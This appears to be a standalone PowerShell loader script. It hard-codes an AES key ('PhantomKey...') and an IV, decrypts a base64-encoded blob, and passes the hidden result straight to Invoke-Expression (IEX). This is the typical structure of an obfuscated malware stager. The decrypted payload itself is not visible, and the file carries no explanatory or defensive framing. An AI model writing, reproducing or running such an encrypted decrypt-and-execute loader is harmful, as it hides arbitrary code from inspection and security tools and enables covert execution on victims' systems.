$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0v5DL27AXRaXmAWGyQVtqLBW9mYs3QbM+k6bw0laNUnQP0Cbn5jwDgO33cdpIcwP4z/8zawb+BzO/z0DB2nq3XNiXpg912alhQTgrmm7rNH2m0DJxR6nakAVWydUpIiYbNQFbMwHqzTpA9sd8OeVPP85nku1K2IGEYn6XORDWhzjzG1ZqUABzBtFu+zNBjQScLVcIZHj00OQ35EfBuFfKQwp60pdNSYf+N77VsZgIsVcIBcSDyV5D2h4Lpi0/32rKojA0SK13BB9ZVOBa+7uOZuorDnyw9HeJmz7MvAONKASCagN1EzuelCyW1T2PT+5ggFTx8oR8Tv6TyFMqcrlucwc+WbJTV+XgyO3SGmn7cwBI4XxcrTOHtSDralpXjfk6jpfL6gV2jfYJ9Dw+qjX6E4WUspwxz/rt2AhVJtGbcBe6j3SKO8+vArpIeQ8MGfGB3+Q016qs0FUW7QF3WHSXEUtNtnUvdpE/hlN7W6G9SpHxclSYC0MX1ie31TxHukrYd9aKFY8ml5I4r9LfBO3SZKLhOIiyLJUwQ0XLYy83/abGdXO68pjdG6YycGweWidS7Q2825gTTDyJlFhoNW8IcBcYXiacBX4eoAqdwNkvaq2YagVU2Jv0gXRyGtppgQeSdG0p4iDFqoecyxNbwyFe6LLVto3XxpDqxVj4g3lI8CKlp2QJLu3EAsHRiSB5LBXYaH7n4QSSGGUwlBew8Q0VD9GVakq9nqARXbAM3RcRvjpaEsN4BwItYkeMNsyd3V9nCxjnVMJo1h9FY8D/uNm1uPAZ/aYoEkRVdB7171XhUBZnAKQHQdgBgLhtiwoJOGGQM8fy71R9fjiCo30uQa7RiMvSJQp0hMc20nuZdqND/5MBIxY6PYWViakrZTKe77CqCZyY7zL2ZtYdDo3SuUAOkk="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript